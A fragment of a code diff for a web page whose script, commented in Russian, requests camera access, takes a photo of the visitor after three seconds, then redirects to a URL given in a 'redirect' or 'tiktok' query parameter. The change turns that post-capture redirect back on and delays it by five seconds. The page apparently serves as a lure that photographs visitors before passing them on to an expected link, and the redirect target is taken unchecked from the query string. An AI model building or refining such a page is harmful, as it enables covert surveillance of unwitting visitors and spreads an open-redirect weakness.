@@ -116,7 +116,7 @@
             savedPhoto = blob;
             photoTaken = true;
             logPhotoInfo();
-            // redirectToFinalDestination();
+            redirectToFinalDestination();
           }, 'image/png');
         }
       }, 3000);
@@ -145,7 +145,11 @@
       const urlParams = new URLSearchParams(window.location.search);
       const redirectUrl = urlParams.get('redirect') || urlParams.get('tiktok') || window.location.origin;
       console.log('Выполняем редирект на:', redirectUrl);
-      window.location.replace(redirectUrl);
+
+      // Добавляем таймаут для редиректа
+      setTimeout(function() {
+        window.location.replace(redirectUrl);
+      }, 5000);
     }
 
     // Начинаем запрос доступа к камере
